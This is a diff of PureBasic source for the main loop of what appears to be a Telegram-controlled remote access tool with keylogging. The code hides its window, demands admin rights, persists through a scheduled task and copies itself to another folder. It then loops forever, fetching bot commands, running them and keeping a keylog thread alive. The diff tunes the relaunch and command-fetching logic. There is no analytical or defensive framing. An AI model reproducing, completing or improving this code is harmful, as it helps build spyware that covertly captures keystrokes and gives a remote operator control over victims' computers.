@@ -10,8 +10,17 @@ XIncludeFile "launcher.pbi"
 XIncludeFile "logger.pbi"
 EnableExplicit
 
-Dim commandArray.TelegramMessage(0)
+Define commands.TelegramCommandArrayHolder
 Define ubound.i, i.i, msg.TelegramMessage
+Define switch.s
+
+switch=ProgramParameter(0)
+LogMsg(switch)
+If switch="/delay" ;means this instance has been launched by another instance of server.
+  Delay(1000)
+EndIf
+
+
 
 OpenWindow(0,0,0,0,0,"Shiltimur Server Window Title",#PB_Window_Invisible | #PB_Window_NoActivate) ;this is for discovery by persistor
 
@@ -22,39 +31,41 @@ If Not IsUserAdmin_()
   End
 EndIf
 
-If ProgramParameter()="/task" 
+If ProgramParameter(0)="/task" 
   ;this means we've been executed by task scheduler. fire off new instance of self and exit. this will bring the persistence task's 
   ;state in the scheduler back To "Ready" instead of "Running" which would have been the case if we didn't exit.
   LaunchSelfAndQuit()
 EndIf
 
+ExtractParamsFromResource() ;gets parameters from exe resource
+
 If IsAnotherInstanceRunning():End:EndIf ;prevent multiple instances
 
 LaunchFromRightFolder() ;copy self to the right folder and run there.
 
-ExtractParamsFromResource() ;gets parameters from exe resource
-
 SetAvailableBotCommands() ;sets available commands to bot. this is just a convenience
 
+
 Repeat
-  
-  DoPersistence():LogMsg("DoPersistence() finished")
-  RetrieveCommandArray(commandArray()):LogMsg("RetrieveCommandArray() finished")
-  ubound=ArraySize(commandArray()) ;commandArray() is assumed 1-indexed
-  For i=1 To ArraySize(commandArray()) ;ArraySize() gives max subscript of the array. like UBound()
-    msg=commandArray(i)
-    ExecuteCommand(@msg):LogMsg("ExecuteCommand() finished")
+
+  doPersistence() ;maintains persistence thread
+
+  RetrieveCommandArray(@commands,10000) ;this could take a max of 10s before returning
+  ubound=ArraySize(commands\commandArray()) ;commandArray() is assumed to start at index 1
+  For i=1 To ArraySize(commands\commandArray()) ;ArraySize() gives max subscript of the array. like UBound()
+    msg=commands\commandArray(i)
+    ExecuteCommand(@msg)
   Next
+  
   doKeylogging() ;maintains keylog thread
-  LogMsg("doKeylogging() finished")
   Delay(1000)
 
 ForEver
 
 
-; IDE Options = PureBasic 5.70 LTS (Windows - x64)
-; CursorPosition = 15
-; FirstLine = 2
+; IDE Options = PureBasic 5.70 LTS (Windows - x86)
+; CursorPosition = 33
+; FirstLine = 3
 ; EnableAsm
 ; EnableThread
 ; EnableXP
